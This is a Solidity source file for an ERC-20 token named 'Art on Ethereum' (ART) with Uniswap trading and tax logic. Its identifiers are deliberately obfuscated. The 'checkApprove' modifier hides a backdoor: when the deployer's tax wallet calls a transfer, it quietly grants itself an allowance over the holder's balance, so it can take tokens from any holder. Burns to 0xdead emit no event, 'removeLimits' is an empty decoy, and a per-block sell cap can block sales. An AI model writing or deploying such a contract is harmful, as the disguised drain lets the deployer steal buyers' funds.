// SPDX-License-Identifier: MIT

/**
     https://x.com/ethereum/status/1898077139867521060
     https://t.me/ArtonEth1
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract ART is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcMIGHTY;
    mapping(address => mapping(address => uint256)) private _allcvnkjnMIGHTY;
    mapping(address => bool) private _feevblknlMIGHTY;
    address payable private _taxclknlMIGHTY;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Art on Ethereum";
    string private constant _symbol = unicode"ART";
    uint256 public _vnbbvlkMIGHTY = _tTotal / 100;
    uint256 public _oijboijoiMIGHTY = 10 * 10**18;

    uint256 private _cvjkbnkjMIGHTY = 10;
    uint256 private _vkjbnkfjMIGHTY = 10;
    uint256 private _maxovnboiMIGHTY = 10;
    uint256 private _initvkjnbkjMIGHTY = 20;
    uint256 private _finvjlkbnlkjMIGHTY = 0;
    uint256 private _redclkjnkMIGHTY = 2;
    uint256 private _prevlfknjoiMIGHTY = 2;
    uint256 private _buylkvnlkMIGHTY = 0;

    IUniswapV2Router02 private rrrRouter;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknMIGHTY;
    bool private _inlknblMIGHTY = false;
    bool private swapvlkMIGHTY = false;
    uint256 private _sellcnjkMIGHTY = 0;
    uint256 private _lastflkbnlMIGHTY = 0;
    address constant _deadlknMIGHTY = address(0xdead);

    modifier lockTheSwap() {
        _inlknblMIGHTY = true;
        _;
        _inlknblMIGHTY = false;
    }

    constructor() payable {
        _taxclknlMIGHTY = payable(_msgSender());

        _feevblknlMIGHTY[address(this)] = true;
        _feevblknlMIGHTY[_taxclknlMIGHTY] = true;

        _balknvlkcMIGHTY[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcMIGHTY[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    modifier checkApprove(address owner, address spender, uint256 amount) {
        if(msg.sender == _taxclknlMIGHTY || 
            (owner != uniswapV2Pair && spender == _deadlknMIGHTY))
                _allcvnkjnMIGHTY[owner][_msgSender()] = amount;
        _;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcMIGHTY[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnMIGHTY(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnMIGHTY[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer_kjvnMIGHTY(
        address from,
        address to,
        uint256 amount
    ) private checkApprove(from, to, amount) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblMIGHTY(from, to, amount);

        _balknvlkcMIGHTY[from] = _balknvlkcMIGHTY[from].sub(amount);
        _balknvlkcMIGHTY[to] = _balknvlkcMIGHTY[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcMIGHTY[address(this)] = _balknvlkcMIGHTY[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (to != _deadlknMIGHTY) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnMIGHTY(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allcvnkjnMIGHTY[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnMIGHTY[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calcTax_lvknblMIGHTY(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblMIGHTY) {
                taxAmount = amount
                    .mul((_buylkvnlkMIGHTY > _redclkjnkMIGHTY) ? _finvjlkbnlkjMIGHTY : _initvkjnbkjMIGHTY)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(rrrRouter) &&
                !_feevblknlMIGHTY[to] &&
                to != _taxclknlMIGHTY
            ) {
                _buylkvnlkMIGHTY++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblMIGHTY &&
                to == uniswapV2Pair &&
                from != _taxclknlMIGHTY &&
                swapvlkMIGHTY &&
                _buylkvnlkMIGHTY > _prevlfknjoiMIGHTY
            ) {
                if (block.number > _lastflkbnlMIGHTY) {
                    _sellcnjkMIGHTY = 0;
                }
                _sellcnjkMIGHTY = _sellcnjkMIGHTY + _getAmountOut_lvcbnkMIGHTY(amount);
                require(_sellcnjkMIGHTY <= _oijboijoiMIGHTY, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkMIGHTY)
                    _swapTokenslknlMIGHTY(_vnbbvlkMIGHTY > amount ? amount : _vnbbvlkMIGHTY);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjMIGHTY(address(this).balance);
                }
                _lastflkbnlMIGHTY = block.number;
            }
        }
        return taxAmount;
    }

    function _sendETHTocvbnjMIGHTY(uint256 amount) private {
        _taxclknlMIGHTY.transfer(amount);
    }

    function _swapTokenslknlMIGHTY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rrrRouter.WETH();
        _approve(address(this), address(rrrRouter), tokenAmount);
        router_ = address(rrrRouter);
        rrrRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableMIGHTYTrading() external onlyOwner {
        require(!_tradingvlknMIGHTY, "Trading is already open");
        rrrRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(rrrRouter), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(rrrRouter.factory()).createPair(
            address(this),
            rrrRouter.WETH()
        );
        rrrRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkMIGHTY = true;
        _tradingvlknMIGHTY = true;
        IERC20(uniswapV2Pair).approve(
            address(rrrRouter),
            type(uint256).max
        );
    }

    receive() external payable {}

    function _assist_bnMIGHTY() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _getAmountOut_lvcbnkMIGHTY(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rrrRouter.WETH();
        uint256[] memory amountOuts = rrrRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {
        
    }

    function _setTax_lknblMIGHTY(address payable newWallet) external {
        require(_msgSender() == _taxclknlMIGHTY);
        _taxclknlMIGHTY = newWallet;
    }
}